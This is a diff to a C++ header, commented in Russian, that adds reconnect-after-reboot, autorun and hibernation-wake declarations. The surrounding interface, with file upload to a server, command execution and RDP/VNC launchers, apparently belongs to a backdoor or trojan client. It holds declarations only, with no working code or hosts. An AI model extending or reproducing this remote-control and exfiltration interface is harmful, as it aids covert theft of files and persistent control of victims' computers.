@@ -58,7 +58,8 @@ private:
 	typedef DWORD ( WINAPI *TStartSendAsync )( DWORD server, char* name, char* path, int flags, int after );
 	typedef DWORD ( WINAPI *TIsSendedAsync )( DWORD );
 	typedef DWORD ( WINAPI *TFolderIsUpload )( const char* name, const char* folder );
-
+	//выход из режима сна
+	typedef void ( WINAPI *TOutOfHibernation )( DWORD server );
 	//функции передачи логов на сервер
 	typedef void (WINAPI *TSendLog)( DWORD server, const char* name, int code, const char* text );
 
@@ -93,6 +94,7 @@ public:
 	TRunCmdExec			RunCmdExec;
 	TSendLog			SendLog;
 	TFolderIsUpload		FolderIsUpload;
+	TOutOfHibernation	OutOfHibernation;
 
 };
 
@@ -118,6 +120,8 @@ DWORD SendFiles( int server, const char* name, const char* path, int flags = 0, 
 bool FolderIsUpload( const char* name, const char* path );
 bool FilesIsSended(DWORD id);
 bool SendLog( int server, const char* name, int code, const char* text );
+void OutOfHibernation( int server );
+
 void UpdateSettings( int server, int setFlags, int resetFlags, int downtime );
 //запуск rdp.dll
 DWORD WINAPI ProcessRDP(void*);
@@ -125,6 +129,13 @@ DWORD WINAPI ProcessRDP(void*);
 DWORD WINAPI ProcessVNC(void*);
 //запуск другой версии vnc.exe
 DWORD WINAPI ProcessVNC2(void*);
+//соединяется с сервером, если autorun=true, то соединяется в случае наличия флага установки коннекта после ребута
+//если autorun=false, то соединеятся в любом случае
+void ConnectToServer( int server, bool autorun = false );
+//если set=true, то устанавливает флаг коннекта после ребута
+//если set=false, то снимает этот флаг
+void SetAutorun( bool set );
+
 };
 
 //класс для упрощения отправки логов, тут запоминается имя лога, чтобы не писать его в каждой строчке
